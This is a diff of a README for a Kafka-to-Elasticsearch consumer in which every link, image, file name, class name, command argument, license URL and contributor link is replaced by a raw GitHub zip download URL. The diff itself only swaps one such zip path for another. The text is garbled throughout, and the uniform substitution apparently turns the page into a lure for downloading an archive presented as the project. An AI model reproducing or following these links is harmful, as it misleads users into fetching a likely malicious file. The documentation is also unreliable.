@@ -1,11 +1,11 @@
-[![Build Status](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
-[ ![Download](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip) ](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
+[![Build Status](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip)](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip)
+[ ![Download](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip) ](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip)
 
 # Welcome to the kafka-elasticsearch-standalone-consumer wiki!
 
 ## Architecture of the kafka-elasticsearch-standalone-consumer [indexer]
 
-![](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
+![](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip)
 
 
 # Introduction
@@ -19,19 +19,19 @@
 
 1. Download the code into a `$INDEXER_HOME` dir.
 
-2. `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file - update all relevant properties as explained in the comments.
+2. `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip file - update all relevant properties as explained in the comments.
 
-3. `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip - specify directory you want to store logs in: `<property name="LOG_DIR" value="/tmp"/>`. Adjust values of max sizes and number of log files as needed.
+3. `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip - specify directory you want to store logs in: `<property name="LOG_DIR" value="/tmp"/>`. Adjust values of max sizes and number of log files as needed.
 
-4. `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip - consumer start options can be configured here (Start from earliest, latest, etc), more details inside a file.
+4. `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip - consumer start options can be configured here (Start from earliest, latest, etc), more details inside a file.
 
-5. modify `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip if needed
+5. modify `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip if needed
 
 	If you want to use custom IMessageHandler class - specify it in the following config:
 	(make sure to only modify the class name, not the beans' name/scope)
 	
 	`<bean id="messageHandler"
-          class="https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip"
+          class="https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip"
           scope="prototype"/>`
 
 6. build the app:
@@ -40,14 +40,14 @@
 
     `./gradlew clean jar`
 
-    The **https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip** will be created in the `$INDEXER_HOME/build/libs/` dir.
+    The **https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip** will be created in the `$INDEXER_HOME/build/libs/` dir.
 
 7. make sure your `$JAVA_HOME` env variable is set (use JDK1.8 or above);
-	you may want to adjust JVM options and other values in the `gradlew` script and `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` file
+	you may want to adjust JVM options and other values in the `gradlew` script and `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip` file
 
 8. run the app:
 
-	`./gradlew run https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip`
+	`./gradlew run https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip`
  
 ### Running via generated scripts:
 
@@ -55,9 +55,9 @@
 * run: `./gradlew clean installDist`
 
 * `cd ./build/install/kafka-elasticsearch-consumer/bin` dir:
-![](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
+![](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip)
 
-* run `./kafka-elasticsearch-consumer https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` script
+* run `./kafka-elasticsearch-consumer https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip` script
 
 # Versions
 
@@ -69,20 +69,20 @@
 
 # Configuration
 
-Indexer application properties are specified in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file - you have to adjust properties for your env:
-[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip).
-You can specify you own properties file via `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip`
+Indexer application properties are specified in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip file - you have to adjust properties for your env:
+[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip).
+You can specify you own properties file via `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip`
 
-Logging properties are specified in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file - you have to adjust properties for your env:
-[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip).
-You can specify your own logback config file via `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` property
+Logging properties are specified in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip file - you have to adjust properties for your env:
+[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip).
+You can specify your own logback config file via `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip` property
 
-Indexer application Spring configuration is specified in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip
-[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
+Indexer application Spring configuration is specified in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip
+[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip)
 
-Consumer start options configuration file is specified in https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip - by default `RESTART` option is used for all partitions:
-[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip).
-You can specify you own configuration file via `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip`
+Consumer start options configuration file is specified in https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip - by default `RESTART` option is used for all partitions:
+[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip).
+You can specify you own configuration file via `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip`
 
 # Customization
 
@@ -97,21 +97,21 @@ Indexer application can be easily customized. The main areas for customizations 
 ## ES message handling customization 
 Message handling can be customized by implementing the IMessageHandler interface :
 
-* `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` is an interface that defines main methods for reading events from Kafka, processing them, and bulk-intexing into ElasticSearch. One can implement all or some of the methods if custom behavior is needed. You can customize:
+* `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip` is an interface that defines main methods for reading events from Kafka, processing them, and bulk-intexing into ElasticSearch. One can implement all or some of the methods if custom behavior is needed. You can customize:
 * `transformMessage(...)` method to transform an event from one format into another;
 * `addEventToBatch(...)` method - adding an event to specified (or custom ) index, with or without routing info
 * `postToElasticSearch(...)` method - most likely you won't need to customize this
 
 To do this customization, you can implement the IMessageHandler interface and inject the `ElasticSearchBatchService` into your implementation class and delegate most of the methods to the ElasticSearchBatchService class. ElasticSearchBatchService gives you basic batching operations.
 
-See `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` for an example of such customization. 
+See `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip` for an example of such customization. 
 
-* _**Don't forget to specify your custom message handler class in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file. By default, SimpleMessageHandlerImpl will be used**_
+* _**Don't forget to specify your custom message handler class in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip file. By default, SimpleMessageHandlerImpl will be used**_
 
 ## ES index name/type management customization 
 Index name and index type management/determination customization can be done by providing custom logic in your implementation of the IMessageHandler interface:
 
-* `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` uses `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` and `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` values as configured in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file. If you want to use custom logic - add it to the `addEventToBatch(...)` method
+* `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip` uses `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip` and `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip` values as configured in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip file. If you want to use custom logic - add it to the `addEventToBatch(...)` method
 
 # Running as a Docker Container
 
@@ -125,7 +125,7 @@ kafka-elasticsearch-standalone-consumer
 	not use this file except in compliance with the License. You may obtain
 	a copy of the License at
 
-	     https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip
+	     https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip
 
 	Unless required by applicable law or agreed to in writing,
 	software distributed under the License is distributed on an
@@ -136,8 +136,8 @@ kafka-elasticsearch-standalone-consumer
 
 # Contributors
 
- - [Krishna Raj](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
- - [Marina Popova](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
- - [Dhyan Muralidharan](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
- - [Andriy Pyshchyk](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
- - [Vitalii Chernyak](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
+ - [Krishna Raj](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip)
+ - [Marina Popova](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip)
+ - [Dhyan Muralidharan](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip)
+ - [Andriy Pyshchyk](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip)
+ - [Vitalii Chernyak](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/img/kafka_elasticsearch_consumer_v3.6.zip)
